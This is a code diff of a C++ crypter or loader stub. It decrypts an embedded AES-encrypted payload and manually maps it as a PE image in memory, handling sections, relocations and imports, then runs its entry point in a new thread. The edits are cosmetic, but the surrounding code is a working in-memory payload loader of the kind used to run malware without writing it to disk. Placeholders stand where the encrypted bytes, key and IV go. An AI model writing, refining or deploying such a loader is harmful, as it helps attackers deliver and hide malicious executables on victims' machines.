@@ -14,7 +14,7 @@ void printBytesHex(const vector<unsigned char>& bytes, size_t numBytes) {
     for (size_t i = 0; i < numBytes && i < bytes.size(); ++i) {
         cout << hex << setw(2) << setfill('0') << static_cast<int>(bytes[i]) << " ";
     }
-    cout << dec << endl; // Switch back to decimal
+    cout << dec << "\n"; // Switch back to decimal
 }
 vector<unsigned char> decrypt(const vector<unsigned char>& buf, const vector<unsigned char>& key, const vector<unsigned char>& iv) {
     EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
@@ -33,7 +33,7 @@ vector<unsigned char> decrypt(const vector<unsigned char>& buf, const vector<uns
     int len;
 
     if (EVP_DecryptUpdate(ctx, plaintext.data(), &len, buf.data(), buf.size()) != 1) {
-        cerr << "Error during decryption!" << endl;
+        cerr << "decryption call failed\n";
         EVP_CIPHER_CTX_free(ctx);
         exit(1);
     }
@@ -86,7 +86,7 @@ void execute(const vector<unsigned char> &payload) {
         void* sectionSrc = (void*)((BYTE*)payload.data() + section->PointerToRawData);
         memcpy(sectionDest, sectionSrc, section->SizeOfRawData);
 
-        cout << "Section " << section->Name << " copied to " << sectionDest << endl;
+        cout << "Section " << section->Name << " copied to " << sectionDest << "\n";
     }
 
     // Process Relocations
@@ -150,7 +150,7 @@ void execute(const vector<unsigned char> &payload) {
             char* moduleName = (char*)((BYTE*)execMemory + importDescriptor->Name);
             HMODULE module = LoadLibraryA(moduleName);
             if (!module) {
-                cerr << "Failed to load module: " << moduleName << endl;
+                cerr << "Failed to load module: " << moduleName << "\n";
                 return;
             }
             PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)execMemory + importDescriptor->FirstThunk);
@@ -161,7 +161,7 @@ void execute(const vector<unsigned char> &payload) {
                 // Function address
                 FARPROC func = GetProcAddress(module, import->Name);
                 if (!func) {
-                    cerr << "Failed to get address of function: " << import->Name << endl;
+                    cerr << "Failed to get address of function: " << import->Name << "\n";
                     return;
                 }
                 // Set the address in the import table 
@@ -174,20 +174,18 @@ void execute(const vector<unsigned char> &payload) {
 
     // Get the address of the entry point
     void* entryPoint = (void*)((BYTE*)execMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint);
-    cout << "Entry point at: " << entryPoint << endl;
+    cout << "Image entry point: " << entryPoint << "\n";
 
     // Create a new thread that starts execution at the entry point
-    HANDLE thread = CreateThread(
-        NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL
-    );
+    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
 
     if (!thread) {
-        cerr << "CreateThread failed with error code: " << GetLastError() << endl;
+        cerr << "CreateThread failed with error code: " << GetLastError() << "\n";
         VirtualFree(execMemory, 0, MEM_RELEASE);
         return;
     }
 
-    cout << "Thread created, waiting for it to finish\n";
+    cout << "Thread created, waiting...\n";
 
     // Wait for the thread to finish
     WaitForSingleObject(thread, INFINITE);
@@ -196,10 +194,10 @@ void execute(const vector<unsigned char> &payload) {
     CloseHandle(thread);
     VirtualFree(execMemory, 0, MEM_RELEASE);
 
-    cout << "Execution finished\n";
+    cout << "Thread execution finished\n";
 }
 
-
+// Placeholders
 const vector<unsigned char> ENCRYPTED = { /*ENCRYPTED_BYTES*/ };
 const vector<unsigned char> KEY = { /*KEY*/ };
 const vector<unsigned char> IV = { /*IV*/ };
@@ -207,13 +205,6 @@ const vector<unsigned char> IV = { /*IV*/ };
 int main() {
 
     vector<unsigned char> payload = decrypt(ENCRYPTED, KEY, IV);
-
-    // for debugging 
-    //cout << payload.size() << " bytes\n";
-    //printBytesHex(payload, 16);
-
-    //cout << "pre execute";
-    //getchar();
     execute(payload);
 
     return 0;
